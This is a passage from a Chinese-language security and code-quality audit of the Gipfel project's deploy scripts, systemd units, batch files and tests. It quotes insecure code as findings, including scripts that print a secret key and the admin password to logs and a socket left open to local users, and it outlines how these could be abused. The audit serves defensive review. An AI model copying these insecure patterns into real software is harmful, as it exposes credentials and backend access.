- 后果：`UnicodeDecodeError` 未被捕获，脚本以非 0 退出（`bootstrap-dev.bat:152-155` 判定"failed to ensure LOGVIEWER_SECRET_KEY"并 `goto :fail`），开发者看到的是裸露的 Python traceback，而真正原因（文件编码）完全不提示；BOM 场景更隐蔽——脚本报 `[OK] generated ...`，但实际生效的键仍为空，随后 `logviewer/settings.py:30-35` fail-fast 拒绝启动日志查看器，表现成"bootstrap 成功但 8120 起不来"。另外 `current` 判定只做 `.strip()`，不校验长度（弱值如 `x` 会被当成"already set"直接放过）。
- 修复建议：
  1) 读取时容错：`open(ENV_PATH, "r", encoding="utf-8-sig", errors="replace")`（`utf-8-sig` 同时解决 BOM；GBK 场景可先 `errors="replace"` 后检测替换符并给出明确提示"请以 UTF-8 保存 backend/.env"）；
  2) 解析改用 `configparser`-like 的逐行扫描，先 `line.lstrip("\ufeff")`，并对同名键取**最后一条**后再判断，避免"追加出两条键"；
  3) 对已有值增加强度说明与最短长度检查（例如 < 32 字符时打印 `[WARN]` 并提示用 `LOGVIEWER_SECRET_KEY` 生成命令重建），保持幂等但不默默接受弱值。

### [P2] X-13 `gipfel-logviewer.service` 与主服务共用 `RuntimeDirectory=gipfel`，且被授予主应用可写路径

- 位置：`deploy/logviewer.service:29-32`、`deploy/logviewer.service:53`、`deploy/gipfel.service:27-30`
- 代码：
```ini
# 运行目录（.sock + .pid）与日志目录；systemd 在启动前自动创建
RuntimeDirectory=gipfel
RuntimeDirectoryMode=0755
LogsDirectory=gipfel
LogsDirectoryMode=0755
...
ReadWritePaths=__INSTALL_DIR__/backend/uploads __INSTALL_DIR__/backend/logs __INSTALL_DIR__/backend/db.sqlite3 /run/gipfel /var/log/gipfel
```
- 触发条件：两个 unit 都声明 `RuntimeDirectory=gipfel` 与 `LogsDirectory=gipfel`，且 `gipfel.service` 在 `/run/gipfel/gipfel.sock` 上监听 Unix socket（`deploy/gipfel.service:18-24`），目录模式为 `0755`。systemd 在 stop 时清理 `RuntimeDirectory`，若部署过程中只重启其中一个 unit（`update-from-github.sh:441/457` 正是分别 `restart gipfel` 与 `restart gipfel-logviewer`），`systemctl restart gipfel` 会移除并重建 `/run/gipfel`，此时仍持有旧目录 fd 的另一个服务不受影响，但**每次重启都会清掉 socket 目录**；同时 `logviewer.service` 的 `ReadWritePaths` 明确授予了主应用的 `backend/uploads`、`backend/logs` 和 **`db.sqlite3`** 写权限。
- 后果：权限面被无理由放大——日志查看器是一个"只读看日志"的独立站点，却对主业务数据库和上传目录有写权限；一旦日志查看器被拿下（例如 X-22 泄露的 `LOGVIEWER_SECRET_KEY`、或其自身的模板注入），攻击者可直接改写 `db.sqlite3`（配合 `deploy/nginx-gipfel.conf:217-230` 的整站代理暴露面）。`/run/gipfel` 为 0755 意味着同机任意用户可遍历并尝试连接 daphne 的 Unix socket `gipfel.sock`，绕过 nginx 直接访问后端（daphne 不校验对端 UID）。
- 修复建议：
  1) `logviewer.service` 使用独立的 `RuntimeDirectory=gipfel-logviewer`（若不需要 socket 可整行删除），`LogsDirectory` 同理拆分；
  2) 收紧 `ReadWritePaths`：日志查看器只需读 `backend/logs`，把 `backend/uploads` 与 `backend/db.sqlite3` 从它的可写列表移除（改为 `ReadOnlyPaths=` 或干脆不列）；
  3) 给 `RuntimeDirectoryMode` 设 `0700`，或若必须让 nginx 访问 socket，显式 `UMask=0077` + `SocketMode=0660` 并把 nginx 用户加入属组，避免 0755 目录下的 socket 对全体本地用户开放。

### [P2] X-14 `gipfel-logviewer-diag.sh` 把 `LOGVIEWER_SECRET_KEY` 原文打印到 stdout，且调用无超时的 curl 与静默失效的 `sudo -n`

- 位置：`tests/gipfel-logviewer-diag.sh:4-9`、`tests/gipfel-logviewer-diag.sh:13-26`
- 代码：
```bash
set +e
echo "================ 1. .env 当前关键变量 ================"
grep -E "^(LOG_VIEWER_PUBLIC_URL|DJANGO_ALLOWED_HOSTS|LOGVIEWER_ALLOWED_HOSTS|LOGVIEWER_SECRET_KEY|LOG_VIEWER_PORT)=" /opt/gipfel/backend/.env 2>/dev/null || echo "  [warn] /opt/gipfel/backend/.env 缺失"
echo ""
echo "================ 2. 服务单元版本（确认拉到最新）================"
sudo -n cat /opt/gipfel/deploy/logviewer.service 2>/dev/null | grep -E "(ExecStart|WorkingDirectory)" | head -2
```
```bash
PUB_IP=$(grep -E "^DJANGO_ALLOWED_HOSTS=" /opt/gipfel/backend/.env | head -1 | cut -d= -f2 | cut -d, -f1)
echo "  从 .env 读到的公网 IP/域名: ${PUB_IP:-<空>}"
echo "  [a] 模拟公网 IP 裸访问（应 302/200 而非 400）："
curl -s -o /dev/null -w "    Host: ${PUB_IP} -> HTTP %{http_code}\n" -H "Host: ${PUB_IP}" http://127.0.0.1:8121/
```
- 触发条件：`grep` 的 pattern 里直接包含 `LOGVIEWER_SECRET_KEY`，命中即把该键的**完整值**打到终端。这是脚本被设计成"在服务器上执行、并把输出贴给他人排查"的场景（文件名与注释即"一键诊断…在服务器上执行"）。
- 后果：密钥经终端回滚缓冲、SSH 会话记录、截图、工单附件、CI 日志多路泄露。该键与 `JWT_SECRET` 同源用于签发日志查看器与 `/admin` 的一次性防直连令牌（`backend/apps/auth/views.py:187-211`、`backend/apps/common/backend_gate.py:68`），泄露后可直接绕过两道网关。同时第 9 行 `sudo -n cat`（非交互）在无免密 sudo 时静默失败（`2>/dev/null`），诊断输出少一整节却不告警；第 15、22、24、26 行的 `curl` 无 `--max-time`，在 daphne 半死（accept 但不应答）时会永久挂住诊断脚本，而它恰恰是故障时使用的工具。
- 修复建议：
  1) 密钥只输出存在性与长度：`grep -c '^LOGVIEWER_SECRET_KEY=.\+' ` 或 `awk -F= '/^LOGVIEWER_SECRET_KEY=/{print "LOGVIEWER_SECRET_KEY set, len=" length($2)}'`，绝不输出原文；
  2) 所有 `curl` 补 `--max-time 5 --connect-timeout 3`；
  3) `sudo -n` 失败时显式提示（去掉 `2>/dev/null` 或加 `|| echo "  [warn] 需要免密 sudo 或手动执行"`）。

### [P2] X-15 `tests/deploy_public_ip_test.sh` 依赖 `$PWD` 定位被测脚本，从错误目录运行时 8 项断言全部静默 FAIL；且仍在测已删除的 read 分支

- 位置：`tests/deploy_public_ip_test.sh:5-10`、`tests/deploy_public_ip_test.sh:32-68`
- 代码：
```bash
set -uo pipefail

SCRIPT="$PWD/scripts/deploy-linux.sh"
# 仅抽取脚本中的 normalize_ip 函数定义并 source（避免执行主流程的 root/网络操作）
# shellcheck disable=SC1090
source <(sed -n '/^normalize_ip()/,/^}/p' "$SCRIPT")
```
```bash
echo "[2] 公网 IP 解析优先级（镜像脚本分支顺序：--public-ip > curl > read > 跳过）"
# 复刻脚本中的解析决策，返回最终写入 .env 的 URL 值（空表示跳过/由后端推导）
resolve() {
    local PUBLIC_IP="$1"; local DOMAIN="$2"; local TTY="$3"; local CURL_VAL="$4"; local READ_VAL="$5"
```
- 触发条件：
  1) 脚本用 `$PWD` 而非 `BASH_SOURCE` 定位被测文件，`docs`/`README` 级别的标准用法 `bash tests/deploy_public_ip_test.sh` 之外的任何调用方式（例如在 `tests/` 目录内执行、或被其他脚本以绝对路径调用）都会让 `sed` 读不到 `scripts/deploy-linux.sh`，`source` 到空内容，`normalize_ip` 未定义 → 第 23-30 行的 8 个 `assert_eq` 全部得到空串 → 全部 FAIL（`normalize_ip: command not found`），而脚本仍会正常打印 `结果：PASS=0 FAIL=8` 并以 1 退出，看起来像"被测代码回归"。`set -uo pipefail` 无 `-e`，所以不会立刻中止，错误被放大成 8 条噪音。
  2) 函数头注释自述顺序为 `--public-ip > curl > read > 跳过`，`resolve()` 里实现了 `TTY`/`READ_VAL`/`READ_INVALID`/`READ_TIMEOUT` 分支（第 54-66 行）并断言（第 74-76 行）。但 `scripts/deploy-linux.sh:249-259` 已明确移除交互式 `read`（"不再提供交互式手动填写——脚本以 `exec 0</dev/null` 运行（非 TTY），手动 read 恒为 EOF，属死代码，已移除"）。该测试因此在验证一个不存在的分支：它对 `READ_*` 的 PASS 只证明自己的镜像实现自洽，无法反映真实脚本。
- 后果：CI/本地"跑一下单测"会得到假阴性（PASS=0 FAIL=8，误报被测脚本坏了）或假阳性（`READ_*` 用例通过，让人以为交互回退仍存在）；真正被测试的核心逻辑只有 `normalize_ip`，而它恰恰不是这次部署里最容易出错的部分（优先级/落盘逻辑没有任何真实覆盖）。
- 修复建议：
  1) 顶部改为 `SCRIPT="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")/.." && pwd)/scripts/deploy-linux.sh"`，并加 `[[ -f "$SCRIPT" ]] || { echo "找不到被测脚本: $SCRIPT"; exit 2; }` 前置断言（用不同退出码区分"环境错误"与"用例失败"）；
  2) 删除 `TTY/READ_*` 分支与对应断言，改为断言当前真实契约：`--public-ip` 优先、探测失败 → 不写 `LOG_VIEWER_PUBLIC_URL`、`ufw` 使用 `.env` 的 `LOG_VIEWER_PORT`（后者正是 X-08 的存在证明）；
  3) 更彻底的做法是把 `_log_viewer_port` / `resolve` 提取到 `scripts/lib/` 供脚本与测试共用，测试直接 source 生产实现而不是复刻。

### [P2] X-16 `tests/**` 12 个"测试"没有任何断言：全部只打印文案并固定 `exit 0`，其中 2 个还复刻了生产算法

- 位置：`tests/test_user_volume.py:91-106`、`tests/test_stock_ui.js:36-53`、`tests/test_fix.py:26-53`、`tests/test_relative_ranking.py:9-30`
- 代码：
```python
    print("\n\n3. 关键特性验证")
    print("-" * 70)
    print("✅ 用户交易活跃时，做市商减少干预")
    print("✅ 用户交易少时，做市商正常干预")
```
```python
# 测试样式类函数
function getPriceChangeClass(stock) {
  if (stock.changePct === undefined || stock.changePct === 0) {
    // 如果没有涨跌幅信息，使用当前价与初始价比较
    return Number(stock.currentPrice) >= Number(stock.initPrice) ? 'up' : 'down';
  }
  return stock.changePct >= 0 ? 'up' : 'down';
}
```
```python
    # 修复后的代码
    pe_float = float(pe)
    pe_score_correct = (15 - pe_float) / 10.0
    print(f"正确方式计算: {pe_score_correct}")
...
    print("\n✅ 类型转换修复验证通过！")
```
```python
def calculate_raw_fundamental_score(pe, carbon, avg_carbon, happiness, total_shares):
    """计算股票的原始基本面评分（用于相对排名）"""
    score = 50.0  # 基础分50
```
- 触发条件：直接执行这些文件。`test_user_volume.py` / `test_natural_fluctuation.py` / `test_kline.py` / `test_callback_mechanism.py` / `test_improved_mm.py` / `test_solution2.py` / `test_parameter_fluctuation.py` / `test_reduced_intervention.py` / `test_relative_ranking.py` / `test_market_maker.py` 通篇只有 `print`，唯一的"结论"是写死的 `✅` 文案；`test_stock_ui.js` 自建 `getPriceChangeClass` 副本后 `forEach` 打印，无 `process.exitCode`；`test_fix.py` 用 `try/except TypeError` 捕获后**继续**并在第 53 行无条件打印 `✅ 类型转换修复验证通过！`，永远退出码 0。
- 后果：这些文件的存在本身构成"有测试覆盖"的错觉。任何人改坏涨跌幅染色、做市商评分、K 线影线或 Decimal 转换，跑完所有文件都得到一片 `✅` 与退出码 0；`test_relative_ranking.py` / `test_solution2.py` / `test_market_maker.py` 更进一步把生产算法**整段复制**进测试文件（对比 `test_solution2.py:9-50` 与 `test_relative_ranking.py:9-30` 完全同源），所以即使日后补上断言，校验的也是副本而非 `backend/` 里的真实实现——生产实现漂移时测试必然同步"通过"。另外仓库内没有 `pytest.ini` / `pyproject.toml` / `conftest.py`，`backend/requirements.txt` 无 `pytest`，`test_*.py` 被 pytest 收集时又会触发 X-17 的写库副作用，等于"既没跑、也不能安全地跑"。
- 修复建议：
  1) 把有结论价值的场景改写为真实断言 + 失败退出码（`assert` 或 `sys.exit(1 if FAIL else 0)`，参考 `tests/big_number_smoke.py:36-47` 已经正确的 `PASS/FAIL` 计数范式）；纯粹用于打印观察的脚本移出 `tests/`（如 `tools/explore_mm.py`）或重命名去掉 `test_` 前缀；
  2) 删除算法副本，改为 `from apps.market.services import calculate_fundamental_score` 直接从生产模块导入后再断言；
  3) 增加最小测试运行入口（`pytest.ini` + `requirements-dev.txt`），并在其中固定 `DJANGO_SETTINGS_MODULE` 指向测试用 settings，避免 X-17。

### [P2] X-17 两个连库测试把脏数据写进真实开发库，且被 pytest 收集时副作用发生在导入阶段

- 位置：`tests/big_number_smoke.py:20-25`、`tests/sqlite_decimal_roundtrip.py:9-31`
- 代码：
```python
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "backend"))
os.environ.setdefault("DJANGO_SETTINGS_MODULE", "backend.settings")

import django  # noqa: E402

django.setup()
```
```python
with transaction.atomic():
    comp = Competition.objects.create(name="__bignum_rollback_test__")
    fuel = Fuel.objects.create(competition=comp, name="__bignum__", price_per_liter=QUAD)
    fuel.refresh_from_db()
    print("写入值：", QUAD)
    print("读回值：", fuel.price_per_liter)
    print("SQLite 存储形态：", Fuel.objects.filter(pk=fuel.pk).values_list("price_per_liter", flat=True))
    ok = fuel.price_per_liter == QUAD
    print("往返精确：", "PASS" if ok else "FAIL")
    raise SystemExit(0 if ok else 2)  # 事务块内 SystemExit 会触发回滚，数据不残留
```
- 触发条件：`os.environ.setdefault("DJANGO_SETTINGS_MODULE", "backend.settings")` 指向**真实** settings（连 `backend/db.sqlite3`）。`sqlite_decimal_roundtrip.py` 全靠 `raise SystemExit` 位于 `with transaction.atomic()` 内部来回滚（注释自述），但这只在"正常走到 raise"时成立；一旦 `Competition.objects.create` 或 `refresh_from_db` 抛异常（例如模型新增了必填字段、`Competition` 改名），事务仍然回滚，可异常路径若被外层捕获（pytest、IDE 运行器、`unittest` 包装）就会以普通失败结束，此时若同一事务内此前已有提交（同进程内其他代码）则残留可观测。`big_number_smoke.py` 第 13 行自述"需 DB，放最后，失败不阻断前 5 项结论"——它在 `ImportError` 时只 `print [SKIP]`，也就是**跑在真实库上却可能整节跳过而不报错**。真正危险的是运行方式：两个文件都在**模块顶层**执行 `django.setup()`、`objects.create()` 与 `sys.exit()`；被 `pytest tests/` 收集时，collection 阶段就会导入模块并执行建库写入，pytest 会报 `SystemExit` 被忽略的警告，开发者却已在 `backend/db.sqlite3` 里插入/回滚过一次真实事务（并发/锁风险同 X-05）。
- 后果：开发/联调库出现意外写入或锁等待，`__bignum_rollback_test__` 一旦残留就会污染比赛列表、参与统计与前端下拉；更常见的是"跑测试把开发库弄坏"，进而促使开发者直接删库，掩盖真实问题。此外 `big_number_smoke.py` 的 DB 段静默 `[SKIP]` 会让"大数落库"这一关键结论在无人察觉的情况下不被验证。
- 修复建议：
  1) 把这两个文件改为标准 pytest 用例并显式用测试库：`@pytest.mark.django_db(transaction=True)`，或 `django.test.TestCase`（自动建 `test_*.sqlite3` 并在结束时销毁）；不要用 `raise SystemExit` 做回滚；
  2) 需要手工运行（`python tests/xxx.py`）时，在 `django.setup()` 前强制 `os.environ["DJANGO_SETTINGS_MODULE"]="backend.settings_test"`，并把 DB 指向 `:memory:` 或 `--database` 指定的临时文件；
  3) `big_number_smoke.py` 的 DB 段若无法连接应 **FAIL 而非 SKIP**（或至少以非 0 退出码报告"未能验证"），避免静默降级。

### [P2] X-18 `bootstrap-dev.bat` 依赖全局环境变量决定"是否保窗"，二次运行会跳过失败暂停（双击即闪退）

- 位置：`scripts/bootstrap-dev.bat:28-37`
- 代码：
```bat
REM --- keep the window open even if the script dies on a syntax error -----
if not "%GIPFEL_NOEXIT%"=="1" (
  set "GIPFEL_NOEXIT=1"
  cmd /k call "%~f0" %*
  exit /b
)

setlocal
chcp 65001 >nul
cd /d "%~dp0"
```
- 触发条件：这一段在 `setlocal` **之前**执行，`set "GIPFEL_NOEXIT=1"` 因此写进的是父 `cmd.exe` 的持久环境（`cmd /k` 会继承它）。用户在同一个已存在的 cmd 窗口（或在 IDE/资源管理器"在此处打开命令行"后保留的窗口）里第二次执行 `bootstrap-dev.bat` 时，`%GIPFEL_NOEXIT%` 已是 `1`，守卫分支被跳过，脚本直接在当前窗口按普通批处理运行。叠加第 4-16 行的维护规则（"批处理语法错误会让窗口一闪而过并静默跳过所有 pause"）与 `:fail` 分支在第 202-211 行才 `pause`——若这次运行在 `pause` 之前因脚本自身问题（如 `%~1` 解析、`findstr` 正则）中止，窗口不会停留。
- 后果：正是脚本作者在注释里反复强调要避免的"窗口闪退看不到报错"重新出现，且只在"第二次运行"时出现（首次运行反而正常），难以复现；此外 `cmd /k` 把控制权交给一个交互式子 shell（`/k` 不退出），与同目录 `start-dev.bat:43-44`（`start` + `exit /b 0`）的风格不一致，自动化调用（CI/脚本串联）会因 `cmd /k` 永不返回而挂起。
- 修复建议：
  1) 把守卫改成显式的"子进程标记"，避免污染父环境：`if /i not "%~1"=="" ...` 或在 `cmd /c` 启动自身时传入专用参数，例如
     `if not "%~1"=="__inner__" ( cmd /k call "%~f0" __inner__ %* & exit /b )`；
  2) 把 `setlocal` 提到文件最前面（并在 `endlocal` 前完成 `exit /b`），使 `GIPFEL_NOEXIT` 不泄漏到父窗口；
  3) 自动化场景改用 `cmd /c`（或 `start /wait`），只有交互双击才用 `/k`；同时在文件顶部用 `setlocal EnableExtensions EnableDelayedExpansion` 明确语义。

### [P2] X-19 `start-dev.bat` 丢弃 `start` 的启动结果并返回 0；与 `stop-dev.bat`/`dev.py` 的端口约定不一致

- 位置：`scripts/start-dev.bat:42-44`、`scripts/start-dev.bat:46-51`、`scripts/dev.py:101-117`、`scripts/stop-dev.bat:24`
- 代码：
```bat
echo [INFO]  Starting Gipfel dev services in a new window ("Gipfel Dev") ...
start "Gipfel Dev" "%PY%" "%~dp0dev.py"
exit /b 0

:fail
echo.
echo [ERROR] start-dev FAILED. See messages above.
echo.
pause
exit /b 1
```
```python
def _read_logviewer_port() -> int:
    """取 backend/.env 的 LOG_VIEWER_PORT（与旧 start-dev.bat 的 findstr 行为一致：取最后一条）。"""
    port = DEFAULT_LOGVIEWER_PORT
```
```bat
for %%P in (8000 5173 8120) do (
```
- 触发条件：
  1) `start` 是异步启动，其退出码未被检查，`exit /b 0` 无条件返回成功。当 `dev.py` 立即失败（端口被占、`.venv` 被删、`vite.js` 缺失——`dev.py:250-266` 会 `error(...)` 并返回 1，随后 `_pause_if_console()` 因新窗口是 TTY 而等待回车），`start-dev.bat` 依然向调用方报告 0。
  2) `dev.py:101-117` 从 `backend/.env` 读 `LOG_VIEWER_PORT`（可为任意合法端口），`stop-dev.bat:24` 的兜底清理端口列表却是硬编码 `8000 5173 8120`。若把 `LOG_VIEWER_PORT` 改成 9000，则在"Gipfel Dev 窗口被 X 掉/被任务管理器杀掉"（`dev.py` 的 `finally` 没能写清 PID 文件）场景下，`stop-dev.bat` 既没有该 PID 记录、也不会扫 9000，日志查看器进程存活并继续占用 9000，下次启动 `dev.py:261-266` 报"Port already in use"。
- 后果：自动化/IDE 任务把"启动失败"当成功，后续步骤（等待 5173、跑 e2e）在超时后才失败，定位成本高；端口场景则表现为"明明执行了 stop-dev.bat，还是提示端口被占用"，用户被迫手动 `netstat` + `taskkill`。`stop-dev.bat` 另有次要问题：PID 文件残留（`dev.py` 被强杀）时其中记录的 PID 可能已被系统复用，`taskkill /PID` 会误杀无关进程。
- 修复建议：
  1) `start-dev.bat` 改为 `start "Gipfel Dev" cmd /c ""%PY%" "%~dp0dev.py""` 后接 `exit /b %ERRORLEVEL%`，或先做一次"能否启动"的同步探测（例如让 `dev.py` 支持 `--check-only`，先跑它再用 `start`）；
  2) `stop-dev.bat` 的端口列表改为动态读取：`for /f %%p in ('findstr /b "LOG_VIEWER_PORT=" "%BACKEND%\.env"') do ...` 解析出实际端口后加入循环，或在 `dev.py` 里把端口写入 PID 文件旁的一个 `gipfel-dev.ports` 供 `stop-dev.bat` 读取；
  3) `stop-dev.bat` 在 `taskkill` 前用 `wmic process where "ProcessId=%%p" get CommandLine`（或 `tasklist /fi`）核对镜像名，避免误杀被复用的 PID。

### [P3] X-20 `quick-sync.sh` / `migrate-server.sh` 不以脚本自身位置为基准解析 `INSTALL_DIR`，相对路径依赖 `$PWD`

- 位置：`scripts/quick-sync.sh:30-32`、`scripts/quick-sync.sh:57-71`、`scripts/migrate-server.sh:38`、`scripts/migrate-server.sh:76-90`
- 代码：
```bash
# 参数
ACTION="${1:-}"
REMOTE="${2:-}"
INSTALL_DIR="${3:-/opt/gipfel}"
...
for item in "${SYNC_ITEMS[@]}"; do
    src="$INSTALL_DIR/$item"
    dst="$INSTALL_DIR/$(dirname "$item")/"
```
- 触发条件：`quick-sync.sh` 只从 `$3` 取 `INSTALL_DIR`（默认绝对值 `/opt/gipfel`，相对值直接透传），`migrate-server.sh` 从 `--install-dir` 取（同上），两者都**没有** `deploy-linux.sh:78-79` / `update-from-github.sh:77-80` 那种 `SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" ... && pwd)"` 的绝对化处理。于是 `bash scripts/quick-sync.sh push root@h ./opt/gipfel`、或在 `/` 目录下用相对路径调用时，`src`/`dst` 会相对当前工作目录解析。
- 后果：`rsync` 可能把**另一个目录**里的同名文件当作数据源推给生产机（`--force` 语义由 `rsync` 默认覆盖行为决定，会直接覆盖目标机的 `db.sqlite3`/`.env`），或在 `pull` 模式 `mkdir -p "$(dirname "$src")"` 时在意外位置建目录。因为默认值是绝对路径，这个问题只在显式传相对路径时出现，但两个脚本的用法说明只给了绝对路径示例，用户传相对路径不会被任何检查拦住。
- 修复建议：在参数解析后统一绝对化并断言，例如 `INSTALL_DIR="$(cd -- "$INSTALL_DIR" 2>/dev/null && pwd)" || { log_error "目录不存在: $INSTALL_DIR"; exit 1; }`；对 push 方向额外要求 `INSTALL_DIR` 与脚本所在仓库同源（比对 `INSTALL_DIR/backend/manage.py` 与 `$(dirname "$SCRIPT_DIR")/backend/manage.py` 的 inode/内容哈希），防止推错源。

### [P3] X-21 `migrate-server.sh` 的 `--dry-run` 不是无副作用；`--help`/缺参路径的退出码与语义混乱

- 位置：`scripts/migrate-server.sh:46-52`、`scripts/migrate-server.sh:87-106`、`scripts/migrate-server.sh:129-134`、`scripts/migrate-server.sh:211`、`scripts/migrate-server.sh:317-319`
- 代码：
```bash
usage() {
    cat <<EOF
用法: $0 [选项]
...
EOF
    exit 0
}
```
```bash
        -h|--help)    usage ;;
        *)            log_error "未知参数: $1"; usage ;;
```
```bash
remote_exec() {
    local host="$1"
    shift
    if [[ "$DRY_RUN" == true ]]; then
        log_info "[DRY-RUN] 远程执行: $*"
        return 0
    fi
    ssh $SSH_OPTS "$host" "$@"
}
```
```bash
    remote_exec "$REMOTE" "sudo mkdir -p $INSTALL_DIR/backend $INSTALL_DIR/frontend-dist"
```
- 触发条件：
  1) `--dry-run` 只拦截了 `remote_exec` 与 `rsync_transfer`，但第 211 行的 `remote_exec "$REMOTE" "sudo mkdir -p ..."` **通过** `remote_exec` 所以在 dry-run 下被跳过（正确），而第 318 行 `mkdir -p "$BACKUP_DIR"`（pull 模式，直接调用、不经过封装）与第 348 行 `mkdir -p "$INSTALL_DIR"`（有 `DRY_RUN` 判断，正确）并存，说明封装不完整；更关键的是 dry-run 下 `ssh` 依赖的连通性检查（第 192、302 行的 `ssh ... "echo ok"`）**不经过 `remote_exec`**，因此 `--dry-run` 依然会真实建立 SSH 连接、要求免密登录与主机指纹，无法在离线环境预演。
  2) `usage()` 以 `exit 0` 结束；`-h|--help` 与"未知参数"共用它，而第 93-106 行缺 `--mode`/`--target` 时先 `log_error` 再 `usage`，于是三类情况（用户主动求助、参数拼错、参数缺失）**出口码全部为 0**。
- 后果：`--dry-run` 在 CI/离线机上无法作为"仅打印计划"的预演手段（仍会因 SSH 失败而非 0 退出或长时间等待），与帮助文本承诺的"模拟运行，不实际执行"不符；退出码恒 0 使任何自动化（`&&` 串联、监控包装）无法区分"用户看了帮助"与"参数写错了"，参数拼写错误（例如 `--install_dir`）会被静默"成功"处理并把宝贵时间浪费在"迁移成功"的假象上。
- 修复建议：
  1) `usage()` 接受一个状态码参数（`usage() { ...; exit "${1:-0}"; }`），`--help` 传 0、参数错误传 2、缺必填参传 1；
  2) 把 `ssh` 连通性检查也包进 `remote_exec`/`check_remote_command` 的 dry-run 分支（dry-run 下打印"将连接 host 并执行 …"并跳过），使 `--dry-run` 真正零副作用、零网络；
  3) 给 `--ssh-port` 增加校验（`[[ "$SSH_PORT" =~ ^[0-9]+$ ]] && (( SSH_PORT>=1 && SSH_PORT<=65535 ))`），当前非数字端口会被原样拼进 `ssh -p`，报错信息晦涩。

### [P3] X-22 `deploy-linux.sh` / `update-from-github.sh` 把管理员口令与全部密钥写入 stdout 与 `[DIAG]` 日志流

- 位置：`scripts/deploy-linux.sh:285-295`、`scripts/deploy-linux.sh:209-215`、`scripts/deploy-linux.sh:609-617`、`scripts/update-from-github.sh:224`
- 代码：
```bash
    ADMIN_PW="$(head -c 16 /dev/urandom | base64 | tr -d '\n+/=' | head -c 20)"
    if grep -q '^SEED_ADMIN_PASSWORD=' "$INSTALL_DIR/backend/.env"; then
        sed -i -E "s|^SEED_ADMIN_PASSWORD=.*|SEED_ADMIN_PASSWORD=${ADMIN_PW}|" "$INSTALL_DIR/backend/.env"
    else
        echo "SEED_ADMIN_PASSWORD=${ADMIN_PW}" >> "$INSTALL_DIR/backend/.env"
    fi
    ok "管理员密码已生成：admin / ${ADMIN_PW}（首次登录强制改密）"
    echo "[DIAG] SEED_ADMIN_PASSWORD 已生成并写入（$(date +%T)）" >&2
```
```bash
    echo "[DIAG] JWT_SECRET 生成完成（$(date +%T)）" >&2
```
```bash
_SEED_PW="$(grep -E '^SEED_ADMIN_PASSWORD=' "$INSTALL_DIR/backend/.env" 2>/dev/null | cut -d= -f2- | tr -d '[:space:]' | sed -E "s/^['\"]//; s/['\"]$//")"
if [[ -n "$_SEED_PW" ]]; then
    echo "  👤 管理员账号：admin"
    echo "  🔑 管理员密码：${_SEED_PW}"
```
- 触发条件：部署过程被记录——`sudo bash scripts/deploy-linux.sh ... | tee deploy.log`、CI/CD 捕获 stdout/stderr 归档、`screen`/`tmux` 回滚缓冲、堡垒机/云厂商的"命令执行记录"功能。脚本主动把 `SEED_ADMIN_PASSWORD` 明文写到标准输出（第 292 行与第 613 行）与 stderr 的 `[DIAG]` 行（第 293 行），并把"生成了哪些密钥"的时间戳广播到 stderr。
- 后果：超级管理员初始口令落入至少三处持久化位置（终端 scrollback、重定向日志、CI 工件）。虽然 `backend/.env.example:28-34` 说明首次登录强制改密，但在"部署完成到管理员首次登录"这个窗口内（大型活动部署经常数小时到数天），拿到日志的人可直接以 admin 登录并改密接管系统。日志往往被收集到集中式平台，保留期远超事件周期。
- 修复建议：
  1) 口令不落 stdout：默认只打印"已写入 `$INSTALL_DIR/backend/.env` 的 `SEED_ADMIN_PASSWORD`，请用 `sudo grep ^SEED_ADMIN_PASSWORD= ...` 查看"，需要直接展示时通过单独的 `--print-seed-password` 显式开启；
  2) 若必须打印，改为在 TTY 检测通过（`[[ -t 1 ]]`）时才打印，非 TTY（管道/CI）一律不打印；
  3) `[DIAG]` 行去掉密钥名枚举，或统一改为不敏感的"secrets generated"单行提示；同时在文档里建议 `| tee` 用户改用 `umask 077` 与 `sed` 过滤。

### [P3] X-23 `gipfel.service` 的 Unix socket 落在 0755 运行目录且 `UMask` 未收紧，本机任意用户可绕过 nginx 直连后端

- 位置：`deploy/gipfel.service:17-30`
- 代码：
```ini
# 启动 daphne：HTTP + Socket.IO 同源同端口；Unix socket 放运行目录
ExecStart=__INSTALL_DIR__/backend/.venv/bin/daphne \
    -u /run/gipfel/gipfel.sock \
    -b 127.0.0.1 \
    -p 8000 \
    --access-log /var/log/gipfel/access.log \
    --proxy-headers \
    backend.asgi:application

# 运行目录（.sock + .pid）与日志目录；systemd 在启动前自动创建
RuntimeDirectory=gipfel
RuntimeDirectoryMode=0755
```
- 触发条件：`RuntimeDirectoryMode=0755` 且未设置 `UMask`（systemd 默认继承 0022），daphne 在该目录下创建的 `gipfel.sock` 通常为 `srwxr-xr-x`。同机任何本地用户（其他服务账户、共享跳板机上的其他租户、被入侵的低权进程）都可 `connect()` 该 socket。
- 后果：nginx 上做的全部边界加固（`deploy/nginx-gipfel.conf` 的安全响应头、`/admin/` 的 `BackendGateMiddleware` 网关、登录限速按 `X-Real-IP` 的判定）都可以被绕过：直接向 socket 发 HTTP 请求时 `REMOTE_ADDR`/`X-Forwarded-For` 由客户端自定，`trusted_proxies` 逻辑（`backend/backend/settings.py` 注释所述"仅当请求来自此集合内的 REMOTE_ADDR 时才信任其 X-Real-IP"）默认只信回环，而 Unix socket 连接的来源通常被判为回环/本机 → 可以伪造来源 IP 绕过按 IP 的登录限速。daphne 不对 Unix socket 做对端 UID 校验（不同于 gunicorn 的 `--umask`/`--forwarded-allow-ips` 组合）。
- 修复建议：
  1) 若 nginx 与后端同机且 nginx 以 `www-data` 连接 socket，改为 `RuntimeDirectoryMode=0750` 并把 nginx 用户加入 `gipfel` 组，或设置 `UMask=0007` 且 `SocketMode=0660`（systemd 22x 支持 `SocketMode=` 仅用于 `.socket` 单元，进程自建 socket 时用 `UMask` 控制）；
  2) 更简单：如果 8000 端口已经只绑 `127.0.0.1`，则可移除 `-u /run/gipfel/gipfel.sock`（或改为 `-u` 指向 `RuntimeDirectoryMode=0700` 的目录），减少攻击面；
  3) 在 `[Service]` 中显式加 `UMask=0077`，并确认 daphne 生成的 socket 权限符合预期（`systemctl show gipfel -p UMask`）。

### [P3] X-24 `deploy-linux.sh` 在 nginx 启动失败时仍以退出码 0 报告"部署完成"，CI 无法据此判定失败

- 位置：`scripts/deploy-linux.sh:559-568`、`scripts/deploy-linux.sh:604-606`
- 代码：
```bash
    nginx -t || err "nginx -t 失败，请修正"
    # 全新服务器 nginx 可能尚未启动，reload 对未运行服务会失败；按状态选择 start / reload
    systemctl enable nginx 2>/dev/null || true
    if systemctl is-active --quiet nginx; then
        systemctl reload nginx
